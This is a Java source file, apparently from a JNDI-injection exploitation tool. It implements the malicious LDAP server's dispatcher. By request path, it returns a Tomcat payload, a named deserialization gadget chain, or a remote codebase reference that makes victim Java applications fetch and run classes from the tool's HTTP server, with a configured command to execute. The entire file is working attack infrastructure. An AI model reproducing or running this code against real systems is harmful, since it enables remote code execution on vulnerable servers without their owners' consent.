package server.ldap.dispatcher;

import cli.Config;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import server.ldap.interceptor.OperationInterceptor;
import server.ldap.interceptor.RSOperationInterceptor;
import server.ldap.interceptor.TomcatInterceptor;

import java.net.URL;

public class OperationDispatcher extends InMemoryOperationInterceptor {
    private final String CB_PREFIX = "http://127.0.0.1:" + Config.getGlobalInstance().hp + "/";

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String codebase = null;
        String base = result.getRequest().getBaseDN();
        Entry entry = new Entry(base);
        // if base is "RS", then parse gadget's name
        // request: ldap://127.0.0.1:1099/RS/cck1 --> base:RS/cck1
        String gadget = "";
        if (base.startsWith("RS/")) {
            gadget = base.substring(base.lastIndexOf("/")+1);
            System.out.printf("[LDAP] parse gadget %s\n", gadget);
            base = "RS";
        }

        // todo: execute command dynamically, ldap://0.0.0.0:1099/Foo/{command}
        String command = Config.getGlobalInstance().command;

        try {
            switch (base) {
                case "Tom": new TomcatInterceptor().sendResult(entry, result); break;
                case "RS": new RSOperationInterceptor(gadget).sendResult(entry, result); break;
                // not "Tom" and "RS", think of it as "codebase"
                default: {
                    // http://127.0.0.1:{port}/{base_name}
                    codebase = CB_PREFIX + base;
                    System.out.printf("[LDAP] accept request with codebase name '%s'\n", base);
                    new OperationInterceptor(new URL(codebase)).sendResult(entry, result);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
